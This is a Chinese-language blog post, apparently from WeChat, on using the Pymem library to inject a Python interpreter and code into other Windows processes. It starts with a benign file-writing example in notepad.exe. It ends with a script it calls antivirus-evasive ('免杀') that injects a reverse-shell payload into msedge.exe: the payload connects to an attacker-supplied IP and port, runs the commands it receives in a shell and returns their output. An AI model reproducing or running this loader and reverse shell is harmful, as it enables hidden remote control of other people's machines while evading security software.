<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/0c6D2aw9xk-NPKYuCkvoIg)

源码：

H4ckBu7eer-EX/pymem_shellcodeloader: pymem 加载 shellcode 到其他进程 (github.com)

* * *

各位大佬端午好！

最近在研究游戏逆向的时候，发现一个好玩的库——Pymem

> Pymem 文档
> 
> https://pymem.readthedocs.io/en/latest/index.html

* * *

多说不宜，咱开门见山。这个 Pymem 除了修改内存，还可以将 python 解释器以 dll 的形式注入到其他进程，进而在其他进程内执行 shellcode

贴一段官网介绍：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nABU4rQGiatJhwnZHU5YjOWYn8kc5ECnqzCMemiasEghhAj0Q0LdWFcmywlNwUlfgyC2LMLDGZtbkRbW46C3XPxw/640?wx_fmt=png)

来看一段来自官方文档的代码，这段代码的使用 pymem 库来注入 Python 解释器和 Python shellcode 到 notepad.exe 进程中，注释很详细。

```
# 导入pymem模块，这是一个Python内存操作库 
from pymem import Pymem 
# 导入os模块，这是一个提供了丰富的操作系统相关功能的库 
import os 
# 导入subprocess模块，这是一个用于产生子进程，连接到它们的输入/输出/错误管道，获取它们的返回码的库 
import subprocess 
# 使用subprocess.Popen启动记事本程序，并获取其进程对象 
notepad = subprocess.Popen(['notepad.exe']) 
# 使用Pymem模块连接到记事本程序 
pm = Pymem('notepad.exe') 
# 在记事本程序中注入Python解释器 
pm.inject_python_interpreter() 
# 获取当前目录下的pymem_injection.txt文件的绝对路径，并将路径中的反斜杠替换为双反斜杠 
filepath = os.path.join(os.path.abspath('.'), 'pymem_injection.txt') 
filepath = filepath.replace("\\", "\\\\") 
# 定义要注入的Python代码，这段代码会在记事本程序中执行，它会打开一个文件，写入一些内容，然后关闭文件 
shellcode = """ 
f = open("{}", "w+") 
f.write("pymem_injection") 
f.close() 
""".format(filepath) 
# 将定义的Python代码注入到记事本程序中 
pm.inject_python_shellcode(shellcode)
 # 结束记事本程序 
notepad.kill()

```

运行代码后会在 pymem_injection.txt 里写入 pymem_injection。

那我们可以尝试用这种方式实现加载 shellcode 实现上线

* * *

正文：

先创建一个函数，用来指定 shellcode 和注入的进程

```
def inject(shellcode,process):    
    prcs = subprocess.Popen([process])    
    pm = Pymem(process)    
    pm.inject_python_interpreter()    
    pm.inject_python_shellcode(shellcode)    
    prcs.kill()

```

然后写一段 shellcode

```
filepath = os.path.join(os.path.abspath('.'), 'pymem_injection.txt') 
filepath = filepath.replace("\\", "\\\\") 
sc = """ 
f = open("{}", "w+") 
f.write("pymem_injection") 
f.close() 
""".format(filepath)

```

看一下 **shellcode** 长什么样子（见程序输出），运行后已经将 **pymem_injection** 写入了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nABU4rQGiatJhwnZHU5YjOWYn8kc5ECnqEE27iaJLWCguDAyVsRqnWcuhs12qHnymoa3wxibWGUJOhFrK2uln3NOA/640?wx_fmt=png)

好了让我们来看看免杀写出来是什么样子

* * *

* * *

免杀. py：

```
from pymemloader import inject 
sc="""
import subprocessimport socketwith open('cfg', 'r') as f:    sip = f.readline().strip()    sport = int(f.readline().strip())print(sip,sport)client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)client_socket.connect((sip, sport))while True:    recv_data = client_socket.recv(20480)    command=recv_data.decode('utf-8')    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    send_data=result.stdout.decode('gbk')    client_socket.send(send_data.encode('utf-8'))
""" 
#上面的loader可以用自己的pythonshellcodeloader 
#我这里用的是我的python小控https://github.com/H4ckBu7eer-EX/python_remote_CMD 
inject(sc,"msedge.exe")

```

done!